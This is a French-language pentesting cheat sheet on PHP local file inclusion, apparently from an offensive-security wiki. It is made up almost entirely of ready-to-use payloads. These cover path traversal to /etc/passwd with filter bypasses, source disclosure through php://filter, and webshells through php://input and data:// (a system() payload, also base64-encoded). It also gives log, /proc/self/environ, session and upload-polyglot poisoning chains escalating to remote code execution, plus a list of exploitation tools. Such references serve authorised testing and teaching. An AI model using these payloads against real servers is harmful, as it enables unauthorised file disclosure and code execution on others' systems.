---
title: "Inclusion de fichiers locale : lectures, wrappers et empoisonnement vers RCE"
description: "LFI par traversée et wrappers PHP pour la divulgation de source, plus des chaînes d'empoisonnement de log, environ, session et upload qui escaladent une lecture de fichier en exécution de code."
keywords:
  - inclusion de fichiers locale
  - LFI
  - path traversal
  - wrapper php filter
  - log poisoning
  - proc self environ
---

# Local

L'inclusion de fichiers locale survient lorsqu'un sink include/require charge un chemin contrôlé par l'attaquant, en le pointant vers des fichiers déjà présents sur le serveur. La primitive de base est la lecture arbitraire de fichiers ; plusieurs chaînes la promeuvent en exécution de code.

## Traversée pour lire des fichiers

Contre `include($_GET['page'])`, remontez hors du répertoire attendu pour atteindre n'importe quel fichier lisible :

```
?page=../../../../etc/passwd
```

Lorsque le code ajoute une extension, par exemple `include($_GET['page'].'.php')`, un octet nul tronque la chaîne avant le suffixe de sorte que l'include se résout en `/etc/passwd` au lieu de `/etc/passwd.php`. Ceci a été corrigé dans PHP 5.3.4, donc cela ne fonctionne que sur les versions plus anciennes :

```
?page=../../../../etc/passwd%00
```

Un très long `/./././...` en fin de chaîne (troncation de chemin, débordant le buffer de chemin d'environ 4096 octets de PHP) supprimait de même le suffixe ajouté sur les PHP hérités. Sur un PHP moderne, aucune des deux astuces ne vient à bout d'une extension ajoutée, donc une route par wrapper ou par empoisonnement de log est nécessaire à la place.

Par ailleurs, si un filtre supprime les `../` littéraux, contournez le filtre avec des séquences non supprimées de façon récursive et des séparateurs encodés. Celles-ci viennent à bout du *filtre*, pas d'une extension ajoutée :

```
?page=....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%252e%252e%252fetc%252fpasswd
```

## Wrappers PHP

Les wrappers de flux PHP transforment un sink d'inclusion en bien plus qu'une lecture de fichier.

**Divulgation de source avec `php://filter`.** Encodez en base64 un fichier PHP de sorte que l'include renvoie son source au lieu de l'exécuter :

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Décodez le blob renvoyé pour lire les identifiants et la logique. Des filtres chaînés peuvent aussi être détournés pour générer du contenu arbitraire à exécuter.

**Exécution de code avec `php://input`.** Lorsque `allow_url_include` est activé, fournissez du PHP dans le corps POST :

```
POST /?page=php://input HTTP/1.1

<?php system($_GET['c']); ?>
```

**Exécution de code avec `data://`.** Lorsque `allow_url_include` est activé, intégrez le payload en ligne, éventuellement en base64 :

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

## Empoisonnement de log vers RCE

Si vous pouvez lire un log et contrôler des octets qui y sont écrits, injectez du PHP dans le log puis incluez-le. Empoisonnez le log d'accès ou d'erreur via un champ contrôlable tel que `User-Agent` :

```
GET / HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>
```

Puis incluez le log de sorte que l'interpréteur exécute le code implanté :

```
?page=/var/log/apache2/access.log&c=id
?page=/var/log/nginx/access.log&c=id
```

Les logs mail (`/var/log/mail.log` via un `RCPT TO` forgé), les logs d'authentification SSH (un nom d'utilisateur malformé) et les logs FTP fonctionnent de la même manière.

## /proc/self/environ

Là où il est lisible, l'environnement du processus renvoie des valeurs contrôlées par la requête. Injectez du PHP dans `User-Agent` et incluez le fichier environ :

```
?page=/proc/self/environ&c=id
```

Le processus côté serveur écrit votre `User-Agent` dans son bloc d'environnement, et l'include l'exécute.

## Inclusion de fichier de session

Si des valeurs de session stockent l'entrée de l'attaquant, implantez du PHP dans une variable de session, puis incluez le fichier de session :

```
?page=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
```

Récupérez `PHPSESSID` depuis votre propre cookie ; le chemin varie selon la distribution (`/tmp/sess_*`, `/var/lib/php5/`).

## Chaîne upload plus include

Lorsque les uploads sont autorisés mais atterrissent hors de la racine web ou avec une extension non exécutable, l'inclusion comble l'écart. Uploadez un polyglotte préfixé GIF, puis incluez-le de sorte que le moteur exécute le PHP intégré quelle que soit l'extension :

```
?page=../../uploads/avatar.gif&c=id
```

Le sink d'inclusion exécute tout PHP présent dans le fichier référencé, donc le stockage sans extension `.php` ne protège plus le serveur.

## Outils

- **[LFISuite](https://github.com/D35m0nd142/LFISuite)** : détection et exploitation automatisées de LFI.
- **[kadimus](https://github.com/P0cL4bs/Kadimus)** : scan et exploitation de LFI.
- **[fimap](https://github.com/kurobeats/fimap)** : test automatisé d'inclusion de fichiers.
- **[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)** : construit des chaînes `php://filter` pour l'exécution de code.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour les payloads de traversée et de wrapper.

## Références

- [OWASP: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
